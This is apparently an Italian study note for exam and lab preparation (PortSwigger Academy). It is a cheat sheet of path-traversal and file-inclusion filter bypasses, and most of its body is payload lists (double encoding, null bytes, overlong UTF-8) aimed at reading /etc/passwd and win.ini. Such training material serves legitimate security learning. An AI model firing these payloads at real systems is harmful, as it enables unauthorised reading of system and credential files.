# Evasion Filters (File Inclusion)

**Difficolta:** Advanced
**Time to Master:** 1.5h
**Prerequisiti:** [04-Wrappers-PHP.md](04-Wrappers-PHP.md)
**Lab:** PortSwigger Academy — Path traversal, various defenses

---

## Obiettivo

Raccogliere in un unico posto tutte le tecniche di bypass filtro per LFI/RFI: e la sezione "cheatsheet puro" da consultare rapidamente durante l'esame quando un filtro blocca il traversal diretto.

---

## Concetti chiave

### Tipi di filtro comuni e relativa debolezza

| Filtro | Debolezza |
|--------|-----------|
| Rimuove "../" una volta sola | `....//` diventa `../` dopo la rimozione |
| Blacklist su parole ("etc", "passwd") | encoding URL/double encoding bypassa regex letterali |
| Richiede estensione finale (`.php`) | null byte (PHP legacy), wrapper, path troncato |
| Controlla solo l'inizio della stringa | inserisci il path assoluto dopo un prefisso consentito |

---

## Strumenti

Nessun tool dedicato: questa sezione e una lista di payload da provare in sequenza con Burp Repeater/Intruder.

---

## Payload / Esempi

### Esempio 1: bypass "rimozione singola" di ../

```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

### Esempio 2: encoding e double encoding

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini    (Windows, backslash encoded)
```

### Esempio 3: null byte (PHP < 5.3.4)

```
../../../etc/passwd%00
../../../etc/passwd%00.php
```

### Esempio 4: path assoluto dopo prefisso forzato

Se l'app forza un prefisso tipo `pages/` + input:
```
?page=pages/../../../../etc/passwd
```

### Esempio 5: UTF-8 overlong encoding (bypass IDS/WAF datati)

```
..%c0%af..%c0%afetc%c0%afpasswd
```

---

## Evasion / Bypass Techniques

Questo intero file E la sezione evasion — vedi Payload/Esempi sopra per la lista completa.

**Regola pratica:** prova sempre in quest'ordine — traversal diretto, poi doppio encoding, poi wrapper (se disponibili), poi combinazioni case/backslash.

---

## Lab Hands-On

### Lab 1: PortSwigger — path traversal con vari controlli difensivi
**Obiettivo:** applicare la lista di bypass su lab con filtri progressivamente piu stretti
**Difficulty:** Difficile
**Time:** 1h

**Walkthrough breve:**
1. Identifica il tipo di filtro (osserva risposta a `../` semplice vs a doppia codifica)
2. Applica il bypass corrispondente dalla lista
3. Conferma lettura file riuscita

---

## Common Mistakes

- Provare solo un tipo di encoding e arrendersi -> prova sistematicamente tutta la lista, un filtro spesso ne blocca solo una variante
- Non testare mai la combinazione con i wrapper PHP quando il traversal puro fallisce

---

## Link Utili

- [PayloadsAllTheThings — Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PortSwigger Academy — Path traversal defenses](https://portswigger.net/web-security/file-path-traversal)

---

## Connessioni

- **Prerequisito:** [04-Wrappers-PHP.md](04-Wrappers-PHP.md)
- **Prossimo Step:** [Lab-Challenges.md](Lab-Challenges.md)
- **Combinazione con:** [01-LFI-Basics.md](01-LFI-Basics.md)

---

## Checklist di padronanza

- [ ] Conosco a memoria almeno 5 tecniche di bypass diverse
- [ ] So riconoscere il tipo di filtro dal comportamento della risposta
- [ ] Ho un ordine sistematico di tentativi (non a caso)

---

## Note personali

_(spazio libero)_
